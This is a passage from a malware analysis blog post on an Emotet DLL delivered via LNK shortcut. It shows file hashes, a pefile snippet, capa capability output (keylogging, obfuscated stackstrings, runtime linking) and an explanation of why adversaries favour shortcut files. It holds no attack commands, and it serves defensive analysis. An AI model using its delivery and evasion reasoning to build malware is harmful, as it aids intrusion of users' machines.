</span></pre></table></code></div></div><p>It looks like the file is a 64-bit Windows DLL. Let‚Äôs get those hashes:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>pehash vmTbfGSBOW.qsj 
<span class="go">file
    filepath:                        vmTbfGSBOW.qsj
    md5:                             87531dab200c392f33d0d9c18abf53c0
    sha1:                            82412da65a6638050344b87784c8a7ec4468fe58
    sha256:                          3c9b05b81bf7f6e7864527c03f5ed8c87c9c7ebab58a58d1766fd439f2740ce8
    ssdeep:                          12288:C1FIcocJwMTHzXO7N2OBHiyzskF1CubVnmn:tco9MTHzXO7N7/115mn
    imphash:                         6ba79cbed2acbe9b8ecc8e14a572f100
</span></pre></table></code></div></div><p>I also like to get rich header hashes for pivoting with VT Enterprise/Intelligence, and you can do the same using Python and the <code class="language-plaintext highlighter-rouge">pefile</code> library.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pefile</span>

<span class="n">binary</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="n">PE</span><span class="p">(</span><span class="s">'vmTbfGSBOW.qsj'</span><span class="p">)</span>
<span class="n">binary</span><span class="p">.</span><span class="n">get_rich_header_hash</span><span class="p">()</span>

<span class="s">'e47802314222a55b74fe99a752e0b658'</span>
</pre></table></code></div></div><p>With the imphash we can pivot in VT to find files with similar capabilities, with the rich header hash we can pivot in VT to find files with similar build environments. The final thing I want to do tonight is get an idea of the DLL‚Äôs capabilities using <code class="language-plaintext highlighter-rouge">capa</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/emotet$</span><span class="w"> </span>capa vmTbfGSBOW.qsj 
<span class="go">
+------------------------+------------------------------------------------------------------------------------+
| md5                    | 87531dab200c392f33d0d9c18abf53c0                                                   |
| sha1                   | 82412da65a6638050344b87784c8a7ec4468fe58                                           |
| sha256                 | 3c9b05b81bf7f6e7864527c03f5ed8c87c9c7ebab58a58d1766fd439f2740ce8                   |
| path                   | vmTbfGSBOW.qsj                                                                     |
+------------------------+------------------------------------------------------------------------------------+

+------------------------+------------------------------------------------------------------------------------+
| ATT&amp;CK Tactic          | ATT&amp;CK Technique                                                                   |
|------------------------+------------------------------------------------------------------------------------|
| COLLECTION             | Input Capture::Keylogging T1056.001                                                |
| DEFENSE EVASION        | Modify Registry:: T1112                                                            |
|                        | Obfuscated Files or Information::Indicator Removal from Tools T1027.005            |
| EXECUTION              | Shared Modules:: T1129                                                             |
+------------------------+------------------------------------------------------------------------------------+

+-----------------------------+-------------------------------------------------------------------------------+
| MBC Objective               | MBC Behavior                                                                  |
|-----------------------------+-------------------------------------------------------------------------------|
| ANTI-STATIC ANALYSIS        | Disassembler Evasion::Argument Obfuscation [B0012.001]                        |
| COLLECTION                  | Keylogging::Polling [F0002.002]                                               |
| DISCOVERY                   | Application Window Discovery::Window Text [E1010.m01]                         |
| MEMORY                      | Allocate Memory:: [C0007]                                                     |
| OPERATING SYSTEM            | Registry::Create Registry Key [C0036.004]                                     |
|                             | Registry::Delete Registry Key [C0036.002]                                     |
|                             | Registry::Open Registry Key [C0036.003]                                       |
+-----------------------------+-------------------------------------------------------------------------------+

+------------------------------------------------------+------------------------------------------------------+
| CAPABILITY                                           | NAMESPACE                                            |
|------------------------------------------------------+------------------------------------------------------|
| contain obfuscated stackstrings                      | anti-analysis/obfuscation/string/stackstring         |
| log keystrokes via polling                           | collection/keylog                                    |
| contain a resource (.rsrc) section                   | executable/pe/section/rsrc                           |
| extract resource via kernel32 functions (3 matches)  | executable/resource                                  |
| get graphical window text                            | host-interaction/gui/window/get-text                 |
| allocate RWX memory                                  | host-interaction/process/inject                      |
| create or open registry key                          | host-interaction/registry                            |
| delete registry key                                  | host-interaction/registry/delete                     |
| link function at runtime (4 matches)                 | linking/runtime-linking                              |
| link many functions at runtime                       | linking/runtime-linking                              |
| parse PE exports                                     | load-code/pe                                         |
| parse PE header (6 matches)                          | load-code/pe                                         |
+------------------------------------------------------+------------------------------------------------------+
</span></pre></table></code></div></div><p>There are a decent number of capabilities listed but I want to zoom in on a few that may make further static analysis difficult:</p><ul><li>contains obfuscated stackstrings<li>link functions at runtime<li>parse PE header/exports</ul><p>The obfuscated stackstrings will slow static analysis a bit while the analyst figures out what the strings are supposed to say. The function linking at runtime means that we can‚Äôt easily catalog all the capabilities of the DLL using its import table. Once it starts using something like <code class="language-plaintext highlighter-rouge">LoadLibrary</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to manually resolve other imports the sample will get more complicated quickly. Finally, PE header and export parsing isn‚Äôt always a sign of more difficulties, but it can indicate the sample is designed to unpack a second PE and write it into memory for execution. From here the best path for me will be dynamic analysis in a sandbox for further analysis.</p><h2 id="why-a-lnk-shortcut"><span class="mr-2">Why a LNK shortcut?</span><a href="#why-a-lnk-shortcut" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Before winding down for the night, I want to address one question: ‚ÄúWhy would an adversary use LNK files?‚Äù</p><p>Shortcut files present an interesting opportunity compared to other deployment options. Consider MS Office files and the macros therein. As more adversaries have used macros, Microsoft has clamped down and allowed more security controls around macros to make them less useful to adversaries. As more organizations adopt controls to limit macros, adversaries become less effective. Consider script files like VBS, JS, and MSHTA files. Organizations can mitigate against adversaries using these files by disabling their default file handler associations or replacing it with Notepad. Such a change won‚Äôt significantly hinder IT operations in most organizations, and it keeps users from double-clicking to execute malware.</p><p>Shortcut files are specifically designed to be double-clicked for execution. You can‚Äôt really block them easily because doing so would significantly interfere with normal desktop and start menu shortcuts. You can easily change their icons to show whatever image you want, you can specify whatever commands in their metadata you want, and you can easily append data to a shortcut without interfering with its operation. This is a ready-made set of circumstances that allow easy exploitation. Many other adversaries have also explored using LNK files to great effect, including adversaries deploying IcedID and Bumblebee malware.</p><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/emotet/" class="post-tag no-text-decoration" >emotet</a> <a href="/tags/lnk/" class="post-tag no-text-decoration" >lnk</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shortcut to Emotet, an odd TTP change - Tony Lambert&amp;url=https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shortcut to Emotet, an odd TTP change - Tony Lambert&amp;u=https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/&amp;text=Shortcut to Emotet, an odd TTP change - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/shortcut-to-emotet-ttp-change/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/emotet-excel4-macro-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1642377600" > 2022-01-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Emotet's Excel 4.0 Macros Dropping DLLs</h3><div class="text-muted small"><p> It‚Äôs been a little while since I checked in on Emotet to see how its first stage loaders are doing. Lately the first stage has been using Excel 4.0 macros to drop payloads, so in this post I‚Äôll wal...</p></div></div></a></div><div class="card"> <a href="/how-qbot-uses-esentutl/"><div class="card-body"> <em class="timeago small" data-ts="1612137600" > 2021-02-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>How Qbot Uses Esentutl</h3><div class="text-muted small"><p> A colleague asked me a question today about the relationship between Qbot and a Windows system utility: esentutl.exe. It‚Äôs been sparsely documented via tweet, and I want to more fully explain why Q...</p></div></div></a></div><div class="card"> <a href="/analyzing-empire-macos-pkg-stager/"><div class="card-body"> <em class="timeago small" data-ts="1612742400" > 2021-02-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Analyzing an Empire macOS PKG Stager</h3><div class="text-muted small"><p> Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Em...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/snip3-crypter-dcrat-vbs/" class="btn btn-outline-primary" prompt="Older"><p>Snip3 Crypter used with DCRat via VBScript</p></a> <a href="/analyzing-pirrit-adware-installer/" class="btn btn-outline-primary" prompt="Newer"><p>Analyzing a Pirrit adware installer</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
